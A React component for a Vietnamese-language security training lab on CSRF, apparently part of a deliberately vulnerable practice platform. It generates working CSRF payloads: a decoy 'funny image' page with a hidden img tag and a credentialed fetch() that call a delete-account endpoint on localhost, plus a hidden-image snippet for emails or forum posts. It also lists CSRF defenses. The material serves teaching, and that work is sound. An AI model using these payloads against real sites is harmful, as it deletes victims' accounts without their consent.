import { useState } from 'react';
import { useAuth } from '../../context/AuthContext';
import { progressAPI } from '../../services/api';
import './Lab.css';

function Lab12() {
  const [accountDeleted, setAccountDeleted] = useState(false);
  const [generatedHTML, setGeneratedHTML] = useState('');
  const [success, setSuccess] = useState(false);
  const [submitting, setSubmitting] = useState(false);
  const [pointsEarned, setPointsEarned] = useState(0);
  const { isAuthenticated } = useAuth();

  const submitProgress = async (payload, completed) => {
    if (!isAuthenticated() || submitting) return;
    
    setSubmitting(true);
    try {
      const response = await progressAPI.submitLab(12, payload, completed);
      if (completed && response.pointsEarned) {
        setPointsEarned(response.pointsEarned);
      }
    } catch (error) {
      console.error('Error submitting progress:', error);
    } finally {
      setSubmitting(false);
    }
  };

  const handleDeleteAccount = () => {
    const confirm = window.confirm('⚠️ Bạn có chắc muốn xóa tài khoản?');
    if (confirm) {
      setAccountDeleted(true);
      alert('❌ Tài khoản đã bị xóa!');
    }
  };

  const generateAdvancedCSRF = () => {
    const csrfHTML = `<!DOCTYPE html>
<html>
<head>
  <title>Ảnh hài hước 😂</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      text-align: center;
      padding: 50px;
      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
      color: white;
    }
    .container {
      max-width: 600px;
      margin: 0 auto;
      background: white;
      padding: 30px;
      border-radius: 15px;
      color: #333;
    }
    img {
      max-width: 100%;
      border-radius: 10px;
      box-shadow: 0 4px 6px rgba(0,0,0,0.1);
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>😂 Ảnh hài hước của ngày!</h1>
    <p>Xem ảnh bên dưới để cười thả ga...</p>
    
    <!-- Hidden CSRF Attack using Image Tag -->
    <img src="http://localhost:5173/api/user/delete?confirm=yes" 
         style="display:none;" 
         onerror="console.log('CSRF attack executed!')" />
    
    <!-- Decoy Image -->
    <img src="https://via.placeholder.com/500x300/FF6B6B/ffffff?text=Funny+Meme" 
         alt="Funny Image" />
    
    <!-- Alternative: Using Fetch API -->
    <script>
      // Silent CSRF attack using fetch
      fetch('http://localhost:5173/api/user/delete', {
        method: 'POST',
        credentials: 'include', // Include cookies
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({ confirm: 'yes' })
      }).then(() => {
        console.log('Account deletion request sent');
      }).catch(() => {
        // Using img tag as fallback
        var img = new Image();
        img.src = 'http://localhost:5173/api/user/delete?confirm=yes';
      });
    </script>
  </div>
</body>
</html>`;

    setGeneratedHTML(csrfHTML);
    setSuccess(true);
    submitProgress(csrfHTML, true);
  };

  const generateImageBasedCSRF = () => {
    const imgCSRF = `<!-- Simple Image-based CSRF Attack -->
<img src="http://localhost:5173/api/user/delete?confirm=yes" style="display:none;" />

<!-- Or embedded in email/forum post -->
<img src="http://localhost:5173/api/user/delete?confirm=yes" width="1" height="1" />`;

    setGeneratedHTML(imgCSRF);
    setSuccess(true);
    submitProgress(imgCSRF, true);
  };

  const downloadHTML = () => {
    const blob = new Blob([generatedHTML], { type: 'text/html' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = 'csrf_delete_attack.html';
    a.click();
    URL.revokeObjectURL(url);
  };

  const copyToClipboard = () => {
    navigator.clipboard.writeText(generatedHTML);
    alert('✅ Đã copy payload vào clipboard!');
  };

  return (
    <div className="lab-container">
      <div className="lab-header">
        <h2>Lab 12: CSRF - Delete Account</h2>
        <span className="difficulty-badge hard">Khó</span>
      </div>

      <div className="lab-description">
        <h3>📋 Mô tả</h3>
        <p>
          Endpoint xóa tài khoản không có CSRF protection. Kẻ tấn công có thể tạo
          payload khiến nạn nhân vô tình xóa tài khoản của mình chỉ bằng cách
          truy cập một URL hoặc xem một ảnh.
        </p>
        
        <h3>🎯 Mục tiêu</h3>
        <p>Tạo CSRF payload sử dụng thẻ &lt;img&gt; hoặc JavaScript để xóa tài khoản</p>

        <h3>💡 Gợi ý</h3>
        <ul>
          <li>Sử dụng thẻ <code>&lt;img&gt;</code> với src trỏ đến delete endpoint</li>
          <li>Hoặc dùng JavaScript fetch() với credentials: 'include'</li>
          <li>Ẩn payload trong trang web "vô hại" để lừa nạn nhân</li>
          <li>Endpoint: <code>GET /api/user/delete?confirm=yes</code></li>
        </ul>
      </div>

      {success && (
        <div className="success-message">
          🎉 Chúc mừng! Bạn đã tạo thành công CSRF payload nguy hiểm!
          {pointsEarned > 0 && <div className="points-earned">+{pointsEarned} điểm</div>}
        </div>
      )}

      <div className="lab-content">
        {!accountDeleted ? (
          <div className="vulnerable-section">
            <h3>⚠️ Xóa Tài Khoản (Vulnerable)</h3>
            <div className="warning-box">
              <p>⚠️ Hành động này không thể hoàn tác!</p>
              <p>Tài khoản của bạn sẽ bị xóa vĩnh viễn.</p>
            </div>
            <button onClick={handleDeleteAccount} className="delete-btn">
              ❌ Xóa tài khoản
            </button>
          </div>
        ) : (
          <div className="deleted-message">
            <h3>💀 Tài khoản đã bị xóa</h3>
            <p>Tài khoản của bạn không còn tồn tại trong hệ thống.</p>
          </div>
        )}

        <div className="attack-section">
          <h3>⚔️ Advanced CSRF Attack Generator</h3>
          <div className="button-group">
            <button onClick={generateAdvancedCSRF} className="generate-btn">
              🔧 Full HTML Page Attack
            </button>
            <button onClick={generateImageBasedCSRF} className="generate-btn">
              🖼️ Simple Image-Based Attack
            </button>
          </div>

          {generatedHTML && (
            <div className="payload-result">
              <h4>💻 CSRF Payload:</h4>
              <pre>{generatedHTML}</pre>
              <div className="button-group">
                <button onClick={downloadHTML} className="download-btn">
                  💾 Download HTML
                </button>
                <button onClick={copyToClipboard} className="copy-btn">
                  📋 Copy to Clipboard
                </button>
              </div>
            </div>
          )}
        </div>

        <div className="info-box">
          <h4>ℹ️ Attack Vectors</h4>
          <div style={{textAlign: 'left', marginTop: '1rem'}}>
            <p><strong>1. Image Tag Attack:</strong></p>
            <code style={{display: 'block', padding: '0.5rem', background: '#f5f5f5', marginBottom: '1rem'}}>
              &lt;img src="http://target.com/delete?confirm=yes" /&gt;
            </code>

            <p><strong>2. Hidden Form:</strong></p>
            <code style={{display: 'block', padding: '0.5rem', background: '#f5f5f5', marginBottom: '1rem'}}>
              &lt;form action="..." method="POST"&gt;&lt;/form&gt;
            </code>

            <p><strong>3. JavaScript Fetch:</strong></p>
            <code style={{display: 'block', padding: '0.5rem', background: '#f5f5f5'}}>
              fetch(..., {'{'}credentials: 'include'{'}'})
            </code>
          </div>

          <h4 style={{marginTop: '1.5rem'}}>🛡️ Advanced Prevention</h4>
          <ul style={{textAlign: 'left', marginLeft: '1rem'}}>
            <li>Sử dụng CSRF tokens cho mọi state-changing request</li>
            <li>Kiểm tra Origin/Referer headers</li>
            <li>Sử dụng SameSite=Strict cho cookies</li>
            <li>Yêu cầu re-authentication cho thao tác nhạy cảm</li>
            <li>Sử dụng custom headers (X-Requested-With)</li>
          </ul>
        </div>
      </div>
    </div>
  );
}

export default Lab12;
